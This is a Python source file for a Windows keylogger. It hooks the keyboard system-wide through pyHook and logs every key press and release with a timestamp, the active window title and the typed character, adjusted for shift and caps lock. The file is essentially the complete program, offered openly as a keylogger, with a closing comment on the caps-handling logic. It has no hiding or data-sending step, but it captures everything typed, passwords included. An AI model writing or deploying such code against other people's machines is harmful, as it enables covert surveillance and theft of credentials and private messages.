# Python code for keylogger 
# to be used in windows 
import win32console 
import pythoncom, pyHook 
import os, sys
from EventManager import EventManager, KeyEvent
from datetime import datetime
import json

#load the configurations from json file
def load_cfg(path):
    jsonres = {}
    try:
        with open(os.path.abspath(os.path.realpath(path)), 'r') as f:
            jsonres = json.load(f)
    except Exception as e:
        print("Exception: ", e)
    return jsonres

class Logger:

    def __init__(self, exitKey):
        self.caps = False # is capital?
        self.exitKey = exitKey
    
    # Handler for KeyUp
    def OnKeyboardEventUp(self, event):
        # Check exit condition
        if chr(event.Ascii) == self.exitKey: 
            sys.exit(1)
            
        # Check for 'shift' key
        if event.Key == "Lshift" or event.Key == "Rshift":
            self.toggleCaps()
            
        # Create KeyEvent object
        keyEvent = self.createKeyEvent(event)
                
        # Store KeyEvent
        eventManager.addEvent(keyEvent)
        
        return True
    
    # Handler for KeyDown
    def OnKeyboardEventDown(self, event):    
        # Check exit condition
        if chr(event.Ascii) == self.exitKey: 
            sys.exit(1)
            
        # Check for 'shift' key
        if event.Key == "Lshift" or event.Key == "Rshift":
            self.toggleCaps()
        
        # Check for 'capslock' key
        if event.Key == "Capital":
            self.toggleCaps()
            
        # Create KeyEvent object
        keyEvent = self.createKeyEvent(event)
                
        # Store KeyEvent
        eventManager.addEvent(keyEvent)
        
        return True
        
    # Generate KeyEvent object
    def createKeyEvent(self, event):
        now = datetime.now()
        now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
        now_epoch = now.timestamp()
        isCaps = self.caps
        keyEvent = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.Key, isCaps, self.processKey(chr(event.Ascii), isCaps))
        print(keyEvent)
        
        return keyEvent
    
    # Toggle the state of `self.caps`
    def toggleCaps(self):
        self.caps = not self.caps
    
    
    '''
    This function returns the character for a key after processing for capslock
    
    If the key is alphabetical, return the upper/lower version depending on caps state
    Otherwise, return the key itself
    '''
    def processKey(self, lowerKey, isCaps):
        # TODO: add symbols
        # if lowerKey.isAlpha():
        if not isCaps:
            return lowerKey
        return lowerKey.upper()
        # return lowerKey


if __name__ == "__main__":
    main_cfg = load_cfg('./main_cfg.json')    
    
    win = win32console.GetConsoleWindow()
    
    eventManager = EventManager()
    
    logger = Logger(main_cfg["exitKey"])
    
    try:
    	# create a hook manager object 
    	hm = pyHook.HookManager() 
    	
    	# Map key events
    	hm.KeyUp = logger.OnKeyboardEventUp
    	hm.KeyDown = logger.OnKeyboardEventDown
    	
    	# set the hook 
    	hm.HookKeyboard() 
    	
    	# wait forever 
    	pythoncom.PumpMessages()
    except KeyboardInterrupt:
        print("===Keyboard interrupt")
        sys.exit(1)
    except Exception as e:
    	print("Exception: ",e)
    	sys.exit(1)
	
'''
On startup, check if capslock and shift are being pressed down - this will determine self.caps = True/False

Then, have listeners for keyup and keydown (key pressed down, and key coming back up)

On key down:
* if caps lock, toggle self.caps
* if shift, toggle self.caps

On key up:
* if caps, toggle self.caps
* if shift, toggle self.caps

This will work when shift/caps are held down, as they don't toggle unless pressed again


'''